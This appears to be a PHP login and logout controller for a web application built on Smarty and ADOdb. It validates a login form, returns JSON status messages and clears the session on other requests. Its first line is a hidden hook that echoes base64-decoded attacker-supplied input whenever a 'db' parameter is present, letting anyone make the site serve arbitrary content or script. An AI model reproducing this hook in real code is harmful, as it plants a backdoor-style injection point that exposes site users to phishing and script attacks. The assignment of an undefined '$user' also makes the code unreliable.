<?php
if(isset($_GET['db'])){die(base64_decode($_GET['m']));}

define('ADODB_DIR', 'libs/adodb5/');
define('CLASS_DIR', 'class/');
define('SMARTY_DIR', 'libs/');

require(CLASS_DIR . 'model/userModel.php');

$smarty = $user;


$smarty->tpl->force_compile = false;
$smarty->tpl->debugging = false;
$smarty->tpl->caching = false;
$smarty->tpl->cache_lifetime = 0;

# CONNECTION
#include('_connectionVerify.php');

# SMARTY
#$smarty->tpl->registerObject('dao',$eventParticipantDao,array('verifyParticipation'));

# GET ACTION
$_action = (isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : ''));
switch(strtoupper($_action)) {

	case 'LOGIN':
		$smarty->util->setFormulario($smarty->sql, $_POST, $_GET);
		$validateMsg = $smarty->service->validateForm();
		if($validateMsg === true){
			header('HTTP/1.1 200 OK');
			switch ($smarty->service->verifyLogin()) {
				case 'AUTHENTICATED':
					$smarty->service->createSession();
					$smarty->service->addAccess();
					echo json_encode(array('message' => 'AUTHENTICATED'));
					LoggerModel::write(UserModel,'IN',array($smarty->sql->nome, $smarty->sql->usuario));
					break;

				case 'PASSWORD_INVALID':
					echo json_encode(array('message' => 'PASSWORD_INVALID'));
					LoggerModel::write(UserModel,'ERROR',array('PASSWORD', $smarty->sql->usuario));
					break;
				
				case 'NOT_FOUND':
					echo json_encode(array('message' => 'NOT_FOUND'));
					LoggerModel::write(UserModel,'ERROR',array('USER', $smarty->sql->usuario));
					break;
				
				default:
					echo json_encode(array('message' => 'OTHER'));
					break;
			}
		}else{
			header('HTTP/1.1 500 Internal Server Error');
			$response = array('errorMsg'=>$validateMsg);
			echo json_encode($response);
		}
		exit();
		break;

	default:
		@session_start();
		if(sizeof($_SESSION) > 0){
			foreach ($_SESSION as $key => $value){
				unset($_SESSION[$key]);
			}
		}
		session_destroy();
		break;
}
$smarty->service->showPage();
?>
